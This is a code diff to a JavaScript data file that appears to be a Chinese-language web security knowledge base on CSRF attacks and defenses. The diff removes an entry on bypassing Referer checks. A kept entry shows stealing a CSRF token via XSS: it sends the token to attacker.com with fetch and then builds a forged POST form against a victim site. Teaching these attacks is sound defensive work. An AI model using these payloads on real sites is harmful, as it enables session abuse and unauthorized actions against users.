@@ -203,16 +203,6 @@ const knowledgeData = {
         content: 'CSRF Token是一种防御CSRF攻击的常见方法，但在某些情况下，攻击者可以窃取这些Token并绕过防护。Token窃取通常依赖于XSS漏洞或其他信息泄露来获取有效Token，然后在CSRF攻击中使用。',
         code:
 "// 通过XSS窃取CSRF Token\nlet token = document.querySelector('input[name=csrf_token]').value;\n\n// 将Token发送到攻击者控制的服务器\nfetch('https://attacker.com/collect?token=' + token);\n\n// 之后使用窃取的Token构造CSRF攻击\n<form action=\"https://victim.com/action\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"STOLEN_TOKEN\">\n  <input type=\"hidden\" name=\"action\" value=\"malicious_action\">\n</form>"
-      },
-      {
-        title: 'CSRF绕过Referer检测',
-        content: '许多网站使用HTTP Referer头来防止CSRF攻击，确保请求来自合法来源。绕过Referer检测的技术包括利用浏览器行为、使用meta标签或利用浏览器的Referer策略设置。',
-        examples: [
-          "<meta name=\"referrer\" content=\"no-referrer\">",
-          "利用HTTPS到HTTP跳转: 某些浏览器在HTTPS到HTTP跳转时不发送Referer",
-          "使用data: URI: <iframe src=\"data:text/html,<script>/*CSRF payload*/</script>\"></iframe>"
-        ],
-        difficulty: 'expert'
       }
     ],
     protection: [
